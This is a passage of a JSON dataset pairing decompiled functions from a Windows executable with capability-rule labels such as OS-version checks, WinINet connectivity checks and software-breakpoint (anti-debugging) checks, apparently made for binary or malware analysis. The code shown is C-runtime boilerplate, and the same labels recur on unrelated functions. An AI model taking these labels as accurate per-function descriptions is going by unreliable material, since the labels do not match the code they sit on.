(*_sym.imp.KERNEL32.dll_LCMapStringW)\n                              (*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + -0x1c), iVar1, *(unaff_EBP + 0x18), \n                               *(unaff_EBP + 0x1c));\n                }\n            }\n        }\ncode_r0x0041e56b:\n        if (*(unaff_EBP + -0x34) != 0) {\n            fcn.0041ba6d(*(unaff_EBP + -0x20));\n        }\n        if (*(unaff_EBP + -0x38) != 0) {\n            fcn.0041ba6d(*(unaff_EBP + -0x1c));\n        }\n        goto code_r0x0041e6e9;\n    }\n    *(unaff_EBP + -0x28) = 0;\n    *(unaff_EBP + -0x3c) = 0;\n    if (*(unaff_EBP + 8) == 0) {\n        *(unaff_EBP + 8) = *0x449968;\n    }\n    if (*(unaff_EBP + 0x20) == 0) {\n        *(unaff_EBP + 0x20) = *0x449978;\n    }\n    iVar1 = fcn.00423a40(*(unaff_EBP + 8));\n    *(unaff_EBP + -0x40) = iVar1;\n    if (iVar1 == -1) goto code_r0x0041e6e9;\n    if (iVar1 == *(unaff_EBP + 0x20)) {\n        lpSrcStr = *(unaff_EBP + 8);\n        (*_sym.imp.KERNEL32.dll_LCMapStringA)();\n    }\n    else {\n        lpSrcStr = *(unaff_EBP + 0x20);\n        iVar1 = fcn.00423a83(lpSrcStr, iVar1, *(unaff_EBP + 0x10), unaff_EBP + 0x14, 0, 0, 0x43aee0, 0x38);\n        *(unaff_EBP + -0x28) = iVar1;\n        if (iVar1 == 0) goto code_r0x0041e6e9;\n        uVar6 = *(unaff_EBP + 0xc);\n        lpSrcStr = *(unaff_EBP + 8);\n        lpMultiByteStr_00 = &fcn.0041e336::lpSrcStr;\n        iVar1 = (*_sym.imp.KERNEL32.dll_LCMapStringA)();\n        *(unaff_EBP + -0x24) = iVar1;\n        arg_8h_00 = NULL;\n        if (iVar1 != 0) {\n            *(unaff_EBP + -4) = 0;\n            fcn.0041bcd0();\n            *(unaff_EBP + -0x18) = &fcn.0041e336::lpSrcStr;\n            *(unaff_EBP + -0x44) = &fcn.0041e336::lpSrcStr;\n            fcn.0041cc60();\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (*0x10 == 0x20) {\n                lpMultiByteStr_00 = fcn.0041ba5b();\n                arg_8h_00 = lpMultiByteStr_00;\n                if (lpMultiByteStr_00 == NULL) goto code_r0x0041e6b1;\n                fcn.0041cc60();\n                *(unaff_EBP + -0x3c) = 1;\n            }\n            var_30h_2 = *(unaff_EBP + 0xc);\n            var_34h = *(unaff_EBP + 8);\n            iVar1 = (*_sym.imp.KERNEL32.dll_LCMapStringA)();\n            *(unaff_EBP + -0x24) = iVar1;\n            arg_8h_00 = lpMultiByteStr_00;\n            if (iVar1 != 0) {\n                var_30h_2 = *(unaff_EBP + 0x20);\n                var_34h = *(unaff_EBP + -0x40);\n                fcn.00423a83(var_34h, var_30h_2, lpMultiByteStr_00, unaff_EBP + -0x24, *(unaff_EBP + 0x18), \n                             *(unaff_EBP + 0x1c), lpSrcStr, uVar6);\n            }\n        }\ncode_r0x0041e6b1:\n        if (*(unaff_EBP + -0x3c) != 0) {\n            fcn.0041ba6d(arg_8h_00);\n        }\n    }\n    if (*(unaff_EBP + -0x28) != 0) {\n        fcn.0041ba6d(*(unaff_EBP + -0x28));\n    }\ncode_r0x0041e6e9:\n    *(unaff_EBP + -0x58) = 0x41e6f1;\n    fcn.0041cdbf();\n    return;\n}\n",
        "token_count": 3051
    },
    "0041e788": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.0041e788(uint32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint8_t *unaff_ESI;\n    uint8_t *unaff_EDI;\n    \n    iVar1 = *(unaff_ESI + 4);\n    if ((iVar1 != 0) && (*(iVar1 + 8) != '\\0')) {\n        if ((iVar1 != *(unaff_EDI + 4)) && (iVar1 = fcn.0041e700(iVar1 + 8, *(unaff_EDI + 4) + 8),  iVar1 != 0)) {\n            return 0;\n        }\n        if (((((*unaff_EDI & 2) != 0) && ((*unaff_ESI & 8) == 0)) || (((*param_1 & 1) != 0 && ((*unaff_ESI & 1) == 0))))\n           || (((*param_1 & 2) != 0 && ((*unaff_ESI & 2) == 0)))) {\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 244
    },
    "0041e7f5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041e7f5(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    int32_t iVar5;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0041cd84(0x43af08, 0x10);\n    iVar1 = *(unaff_EBP + 8);\n    iVar5 = *(iVar1 + 8);\n    *(unaff_EBP + -0x1c) = iVar5;\n    iVar2 = fcn.0041e005();\n    *(iVar2 + 0x84) = *(iVar2 + 0x84) + 1;\n    *(unaff_EBP + -4) = 0;\n    iVar2 = *(unaff_EBP + 0x10);\n    while (iVar5 != *(unaff_EBP + 0x14)) {\n        if ((iVar5 < 0) || (*(iVar2 + 4) <= iVar5)) {\n            fcn.0041f067();\n        }\n        iVar3 = iVar5 * 8;\n        piVar4 = *(iVar2 + 8) + iVar3;\n        iVar5 = *piVar4;\n        *(unaff_EBP + -0x20) = iVar5;\n        *(unaff_EBP + -4) = 1;\n        if (piVar4[1] != 0) {\n            *(iVar1 + 8) = iVar5;\n            fcn.0041f0a0(*(*(iVar2 + 8) + 4 + iVar3), iVar1, 0x103);\n        }\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x1c) = iVar5;\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0041e8a8();\n    if (iVar5 != *(unaff_EBP + 0x14)) {\n        fcn.0041f067();\n    }\n    *(iVar1 + 8) = iVar5;\n    fcn.0041cdbf();\n    return;\n}\n",
        "token_count": 538
    },
    "0041e8a8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0041e8a8(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0041e005();\n    if (0 < *(iVar1 + 0x84)) {\n        iVar1 = fcn.0041e005();\n        *(iVar1 + 0x84) = *(iVar1 + 0x84) + -1;\n    }\n    return;\n}\n",
        "token_count": 91
    },
    "0041e908": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041e908(int32_t *param_1)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = *param_1 + in_EAX;\n    if (-1 < param_1[1]) {\n        iVar1 = iVar1 + *(*(param_1[1] + in_EAX) + param_1[2]) + param_1[1];\n    }\n    return iVar1;\n}\n",
        "token_count": 105
    },
    "0041ea7c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.0041ea7c(void)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_20h;\n    \n    *(unaff_EDI + -4) = *(unaff_EBP + -0x38);\n    fcn.0041b763(*(unaff_EBP + -0x3c));\n    iVar1 = fcn.0041e005();\n    *(iVar1 + 0x7c) = *(unaff_EBP + -0x40);\n    iVar1 = fcn.0041e005();\n    *(iVar1 + 0x80) = *(unaff_EBP + -0x44);\n    if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&\n        ((unaff_ESI[5] == 0x19930520 || (unaff_ESI[5] == 0x19930521)))) &&\n       ((*(unaff_EBP + -0x48) == 0 && (*(unaff_EBP + -0x20) != 0)))) {\n        iVar1 = fcn.0041b742(unaff_ESI[6]);\n        if (iVar1 != 0) {\n            fcn.0041b8b2();\n            fcn.0041e8c3(unaff_ESI);\n        }\n    }\n    return;\n}\n",
        "token_count": 364
    },
    "0041eaeb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041eaeb(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint arg_ch_00;\n    uint uVar5;\n    uint8_t *extraout_ECX;\n    int32_t *extraout_EDX;\n    int32_t unaff_EBP;\n    int32_t *arg_8h_00;\n    uint var_4h;\n    \n    fcn.0041cd84(0x43af48, 8);\n    puVar1 = *(unaff_EBP + 0xc);\n    iVar4 = *(unaff_EBP + 8);\n    if (((puVar1[1] == 0) || (*(puVar1[1] + 8) == '\\0')) || ((puVar1[2] == 0 && ((*(puVar1 + 3) & 0x80) == 0))))\n    goto code_r0x0041ec55;\n    uVar2 = *puVar1;\n    arg_8h_00 = extraout_EDX;\n    if (-1 < uVar2) {\n        arg_8h_00 = puVar1[2] + 0xc + extraout_EDX;\n    }\n    *(unaff_EBP + -4) = 0;\n    uVar5 = *(iVar4 + 0x18);\n    if ((uVar2 & 8) == 0) {\n        if ((*extraout_ECX & 1) == 0) {\n            if (*(extraout_ECX + 0x18) == 0) {\n                iVar4 = fcn.00423c4c(uVar5, 1);\n                if ((iVar4 == 0) || (iVar4 = fcn.00423c68(arg_8h_00, 1),  iVar4 == 0)) {\ncode_r0x0041ec4c:\n                    fcn.0041f067();\n                }\n                else {\n                    uVar5 = *(extraout_ECX + 0x14);\n                    arg_ch_00 = fcn.0041e908();\n                    fcn.0041b0f0(arg_8h_00, arg_ch_00, uVar5);\n                }\n            }\n            else {\n                iVar4 = fcn.00423c4c(uVar5, 1);\n                if (((iVar4 == 0) || (iVar4 = fcn.00423c68(arg_8h_00, 1),  iVar4 == 0)) ||\n                   (iVar4 = fcn.00423c84(*(extraout_ECX + 0x18)),  iVar4 == 0)) goto code_r0x0041ec4c;\n                if ((*extraout_ECX & 4) == 0) {\n                    uVar5 = fcn.0041e908();\n                    fcn.0041b45d(arg_8h_00, *(extraout_ECX + 0x18), uVar5);\n                }\n                else {\n                    uVar5 = fcn.0041e908(1);\n                    fcn.0041b45d(arg_8h_00, *(extraout_ECX + 0x18), uVar5);\n                }\n            }\n        }\n        else {\n            iVar3 = fcn.00423c4c(uVar5, 1);\n            if ((iVar3 == 0) || (iVar3 = fcn.00423c68(arg_8h_00, 1),  iVar3 == 0)) goto code_r0x0041ec4c;\n            fcn.0041b0f0(arg_8h_00, *(iVar4 + 0x18), *(extraout_ECX + 0x14));\n            if ((*(extraout_ECX + 0x14) == 4) && (*arg_8h_00 != 0)) goto code_r0x0041eb64;\n        }\n    }\n    else {\n        iVar3 = fcn.00423c4c(uVar5, 1);\n        if ((iVar3 == 0) || (iVar3 = fcn.00423c68(arg_8h_00, 1),  iVar3 == 0)) goto code_r0x0041ec4c;\n        *arg_8h_00 = *(iVar4 + 0x18);\ncode_r0x0041eb64:\n        iVar4 = fcn.0041e908();\n        *arg_8h_00 = iVar4;\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\ncode_r0x0041ec55:\n    fcn.0041cdbf();\n    return;\n}\n",
        "token_count": 1058
    },
    "0041ec67": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041ec67(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint unaff_EBX;\n    int32_t unaff_ESI;\n    uint *unaff_EDI;\n    \n    if (in_ECX != 0) {\n        fcn.0041eaeb(arg_8h, unaff_EBX);\n    }\n    if (arg_1ch == 0) {\n        arg_1ch = unaff_ESI;\n    }\n    fcn.0041b464(arg_1ch, arg_8h);\n    fcn.0041e7f5(unaff_ESI, arg_10h, arg_14h, *unaff_EDI);\n    *(unaff_ESI + 8) = unaff_EDI[1] + 1;\n    iVar1 = fcn.0041e927(arg_8h, unaff_ESI, arg_ch, arg_14h, arg_18h, 0x100);\n    if (iVar1 != 0) {\n        fcn.0041b42d(iVar1);\n    }\n    return;\n}\n",
        "token_count": 283
    },
    "0041ecce": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl\nfcn.0041ecce(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_retaddr;\n    uint in_stack_00000024;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    if ((*arg_8h != -0x7ffffffd) &&\n       (((iVar1 = fcn.0041e005(),  *(iVar1 + 0x74) == 0 ||\n         (iVar1 = fcn.0041b527(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_20h, arg_24h, unaff_ESI, var_8h, var_4h, \n                               unaff_EBP, unaff_retaddr, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, \n                               arg_24h, in_stack_00000024),  iVar1 == 0)) &&\n        (piVar2 = fcn.0041b6a0(arg_18h, arg_20h, arg_1ch, &var_4h, &var_8h),  var_4h < var_8h)))) {\n        do {\n            if (((*piVar2 <= arg_1ch) && (arg_1ch <= piVar2[1])) &&\n               ((iVar1 = *(piVar2[3] * 0x10 + piVar2[4] + -0xc),  iVar1 == 0 || (*(iVar1 + 8) == '\\0')))) {\n                fcn.0041ec67(arg_8h, arg_10h, arg_14h, arg_18h, arg_20h, arg_24h);\n            }\n            var_4h = var_4h + 1;\n            piVar2 = piVar2 + 5;\n        } while (var_4h < var_8h);\n    }\n    return;\n}\n",
        "token_count": 551
    },
    "0041ed8c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0041ed8c(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint var_24h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t *var_10h;\n    uint32_t var_ch;\n    int32_t *var_8h;\n    uchar auStack8 [3];\n    uint var_1h;\n    \n    var_1ch = *(arg_ch + 8);\n    _auStack8 = auStack8;\n    if ((var_1ch < -1) || (*(arg_18h + 4) <= var_1ch)) {\n        fcn.0041f067();\n    }\n    if (*arg_8h == -0x1f928c9d) {\n        if ((arg_8h[4] == 3) && (((arg_8h[5] == 0x19930520 || (arg_8h[5] == 0x19930521)) && (arg_8h[7] == 0)))) {\n            iVar2 = fcn.0041e005();\n            if (*(iVar2 + 0x7c) == 0) {\n                return;\n            }\n            iVar2 = fcn.0041e005();\n            arg_8h = *(iVar2 + 0x7c);\n            iVar2 = fcn.0041e005();\n            arg_10h = *(iVar2 + 0x80);\n            _auStack8 = CONCAT13(1, auStack8);\n            iVar2 = fcn.00423c4c(arg_8h, 1);\n            if (iVar2 == 0) {\n                fcn.0041f067();\n            }\n            if (*arg_8h != -0x1f928c9d) goto code_r0x0041ef65;\n            if (((arg_8h[4] == 3) && ((arg_8h[5] == 0x19930520 || (arg_8h[5] == 0x19930521)))) && (arg_8h[7] == 0)) {\n                fcn.0041f067();\n            }\n        }\n        iVar2 = var_1ch;\n        if (((*arg_8h == -0x1f928c9d) && (arg_8h[4] == 3)) && ((arg_8h[5] == 0x19930520 || (arg_8h[5] == 0x19930521))))\n        {\n            piVar3 = fcn.0041b6a0(arg_18h, arg_20h, var_1ch, &var_ch, &var_20h);\n            var_8h = piVar3;\n            if (var_ch < var_20h) {\n                do {\n                    if ((*piVar3 == iVar2 || *piVar3 < iVar2) && (iVar2 <= piVar3[1])) {\n                        var_8h = piVar3;\n                        for (var_18h = piVar3[3]; 0 < var_18h; var_18h = var_18h + -1) {\n                            var_10h = *(arg_8h[7] + 0xc);\n                            for (var_14h = *var_10h; var_10h = var_10h + 1,  0 < var_14h; var_14h = var_14h + -1) {\n                                iVar2 = fcn.0041e788(arg_8h[7]);\n                                piVar3 = var_8h;\n                                if (iVar2 != 0) {\n                                    fcn.0041ec67(arg_8h, arg_10h, arg_14h, arg_18h, arg_20h, arg_24h);\n                                    goto code_r0x0041ef38;\n                                }\n                            }\n                        }\n                    }\ncode_r0x0041ef38:\n                    var_ch = var_ch + 1;\n                    piVar3 = piVar3 + 5;\n                    iVar2 = var_1ch;\n                    var_8h = piVar3;\n                } while (var_ch < var_20h);\n            }\n            if (arg_1ch == '\\0') {\n                return;\n            }\n            fcn.0041e8c3(arg_8h);\n            return;\n        }\n    }\ncode_r0x0041ef65:\n    if (arg_1ch == '\\0') {\n        fcn.0041ecce(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, var_1ch, arg_20h, arg_24h);\n        return;\n    }\n    fcn.0041cd84(0x43af58, 8);\n    iVar2 = fcn.0041e005();\n    if (*(iVar2 + 0x6c) != 0) {\n        _auStack8 = 0;\n        iVar2 = fcn.0041e005();\n        (**(iVar2 + 0x6c))();\n        _auStack8 = 0xffffffff;\n    }\n    fcn.00420bc8(10);\n    fcn.00425353(0x16);\n    fcn.0041cbfc(3);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 1294
    },
    "0041ef90": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0041ef90(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint32_t *arg_18h, int32_t arg_1ch, uint arg_20h\n            , uint32_t arg_24h)\n\n{\n    uint uVar1;\n    \n    if ((*arg_18h & 0x1fffffff) != 0x19930520) {\n        fcn.0041f067();\n    }\n    if ((*(arg_8h + 1) & 0x66) == 0) {\n        if (arg_18h[3] != 0) {\n            if (((*arg_8h == -0x1f928c9d) && (0x19930520 < arg_8h[5])) && (*(arg_8h[7] + 8) != NULL)) {\n                uVar1 = (**(arg_8h[7] + 8))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h & 0xff)\n                ;\n                return uVar1;\n            }\n            fcn.0041ed8c(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_24h, arg_1ch, arg_20h);\n        }\n    }\n    else if ((arg_18h[1] != 0) && (arg_1ch == 0)) {\n        fcn.0041e7f5(arg_ch, arg_14h, arg_18h, 0xffffffff);\n    }\n    return 1;\n}\n",
        "token_count": 382
    },
    "0041f270": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0041f270(void)\n\n{\n    if ((*0x449638 == 2) && (4 < *0x449644)) {\n        return 1;\n    }\n    return 3;\n}\n",
        "token_count": 47
    },
    "0041f28a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint fcn.0041f28a(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    *0x44acbc = (*_sym.imp.KERNEL32.dll_HeapCreate)(param_1 == 0, 0x1000, 0);\n    if (*0x44acbc == 0) {\n        return 0;\n    }\n    *0x44acc0 = fcn.0041f270();\n    if ((*0x44acc0 == 3) && (iVar1 = fcn.0041f2db(0x3f8),  iVar1 == 0)) {\n        (*_sym.imp.KERNEL32.dll_HeapDestroy)(*0x44acbc);\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 170
    },
    "0041f34e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041f34e(uint32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    char *pcVar2;\n    uint32_t *puVar3;\n    int32_t *piVar4;\n    char cVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    code *pcVar8;\n    uint8_t uVar9;\n    uint32_t uVar10;\n    uint32_t *puVar11;\n    uint32_t *puVar12;\n    uint32_t *puVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar6 = arg_8h[4];\n    puVar13 = arg_ch + -4;\n    uVar15 = arg_ch - arg_8h[3] >> 0xf;\n    piVar4 = uVar15 * 0x204 + 0x144 + uVar6;\n    var_4h = *puVar13 - 1;\n    if ((var_4h & 1) == 0) {\n        puVar11 = var_4h + puVar13;\n        uVar14 = *puVar11;\n        uVar7 = *(arg_ch + -8);\n        if ((uVar14 & 1) == 0) {\n            uVar10 = (uVar14 >> 4) - 1;\n            if (0x3f < uVar10) {\n                uVar10 = 0x3f;\n            }\n            if (puVar11[1] == puVar11[2]) {\n                if (uVar10 < 0x20) {\n                    pcVar2 = uVar10 + 4 + uVar6;\n                    uVar10 = ~(0x80000000U >> (uVar10 & 0x1f));\n                    puVar12 = uVar6 + 0x44 + uVar15 * 4;\n                    *puVar12 = *puVar12 & uVar10;\n                    *pcVar2 = *pcVar2 + -1;\n                    if (*pcVar2 == '\\0') {\n                        *arg_8h = *arg_8h & uVar10;\n                    }\n                }\n                else {\n                    pcVar2 = uVar10 + 4 + uVar6;\n                    uVar10 = ~(0x80000000U >> (uVar10 - 0x20 & 0x1f));\n                    puVar12 = uVar6 + 0xc4 + uVar15 * 4;\n                    *puVar12 = *puVar12 & uVar10;\n                    *pcVar2 = *pcVar2 + -1;\n                    if (*pcVar2 == '\\0') {\n                        arg_8h[1] = arg_8h[1] & uVar10;\n                    }\n                }\n            }\n            var_4h = var_4h + uVar14;\n            *(puVar11[2] + 4) = puVar11[1];\n            *(puVar11[1] + 8) = puVar11[2];\n        }\n        puVar11 = (var_4h >> 4) + -1;\n        if (0x3f < puVar11) {\n            puVar11 = 0x3f;\n        }\n        puVar12 = arg_8h;\n        if ((uVar7 & 1) == 0) {\n            puVar13 = puVar13 - uVar7;\n            puVar12 = (uVar7 >> 4) + -1;\n            if (0x3f < puVar12) {\n                puVar12 = 0x3f;\n            }\n            var_4h = var_4h + uVar7;\n            puVar11 = (var_4h >> 4) + -1;\n            if (0x3f < puVar11) {\n                puVar11 = 0x3f;\n            }\n            if (puVar12 != puVar11) {\n                if (puVar13[1] == puVar13[2]) {\n                    if (puVar12 < 0x20) {\n                        uVar14 = ~(0x80000000U >> (puVar12 & 0x1f));\n                        puVar3 = uVar6 + 0x44 + uVar15 * 4;\n                        *puVar3 = *puVar3 & uVar14;\n                        pcVar2 = puVar12 + uVar6 + 4;\n                        *pcVar2 = *pcVar2 + -1;\n                        if (*pcVar2 == '\\0') {\n                            *arg_8h = *arg_8h & uVar14;\n                        }\n                    }\n                    else {\n                        uVar14 = ~(0x80000000U >> (puVar12 - 0x20 & 0x1f));\n                        puVar3 = uVar6 + 0xc4 + uVar15 * 4;\n                        *puVar3 = *puVar3 & uVar14;\n                        pcVar2 = puVar12 + uVar6 + 4;\n                        *pcVar2 = *pcVar2 + -1;\n                        if (*pcVar2 == '\\0') {\n                            arg_8h[1] = arg_8h[1] & uVar14;\n                        }\n                    }\n                }\n                *(puVar13[2] + 4) = puVar13[1];\n                *(puVar13[1] + 8) = puVar13[2];\n            }\n        }\n        if (((uVar7 & 1) != 0) || (puVar12 != puVar11)) {\n            piVar1 = piVar4 + puVar11 * 2;\n            uVar14 = piVar1[1];\n            puVar13[2] = piVar1;\n            puVar13[1] = uVar14;\n            piVar1[1] = puVar13;\n            *(puVar13[1] + 8) = puVar13;\n            if (puVar13[1] == puVar13[2]) {\n                cVar5 = *(puVar11 + uVar6 + 4);\n                *(puVar11 + uVar6 + 4) = cVar5 + '\\x01';\n                uVar9 = puVar11;\n                if (puVar11 < 0x20) {\n                    if (cVar5 == '\\0') {\n                        *arg_8h = *arg_8h | 0x80000000U >> (uVar9 & 0x1f);\n                    }\n                    puVar11 = uVar6 + 0x44 + uVar15 * 4;\n                    *puVar11 = *puVar11 | 0x80000000U >> (uVar9 & 0x1f);\n                }\n                else {\n                    if (cVar5 == '\\0') {\n                        arg_8h[1] = arg_8h[1] | 0x80000000U >> (uVar9 - 0x20 & 0x1f);\n                    }\n                    puVar11 = uVar6 + 0xc4 + uVar15 * 4;\n                    *puVar11 = *puVar11 | 0x80000000U >> (uVar9 - 0x20 & 0x1f);\n                }\n            }\n        }\n        *puVar13 = var_4h;\n        *((var_4h - 4) + puVar13) = var_4h;\n        *piVar4 = *piVar4 + -1;\n        pcVar8 = _sym.imp.KERNEL32.dll_VirtualFree;\n        if (*piVar4 == 0) {\n            if (*0x44aca0 != NULL) {\n                (*_sym.imp.KERNEL32.dll_VirtualFree)(*0x44acb8 * 0x8000 + (*0x44aca0)[3], 0x8000, 0x4000);\n                (*0x44aca0)[2] = (*0x44aca0)[2] | 0x80000000U >> (*0x44acb8 & 0x1f);\n                *((*0x44aca0)[4] + 0xc4 + *0x44acb8 * 4) = 0;\n                *((*0x44aca0)[4] + 0x43) = *((*0x44aca0)[4] + 0x43) + -1;\n                if (*((*0x44aca0)[4] + 0x43) == '\\0') {\n                    (*0x44aca0)[1] = (*0x44aca0)[1] & 0xfffffffe;\n                }\n                if ((*0x44aca0)[2] == 0xffffffff) {\n                    (*pcVar8)((*0x44aca0)[3], 0, 0x8000);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(*0x44acbc, 0, (*0x44aca0)[4]);\n                    fcn.0041b0f0(*0x44aca0, *0x44aca0 + 5, (*0x44aca4 * 0x14 - *0x44aca0) + -0x14 + *0x44aca8);\n                    *0x44aca4 = *0x44aca4 + -1;\n                    if (*0x44aca0 < arg_8h) {\n                        arg_8h = arg_8h + -5;\n                    }\n                    *0x44acb0 = *0x44aca8;\n                }\n            }\n            *0x44aca0 = arg_8h;\n            *0x44acb8 = uVar15;\n        }\n    }\n    return;\n}\n",
        "token_count": 2163
    },
    "0041fb02": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
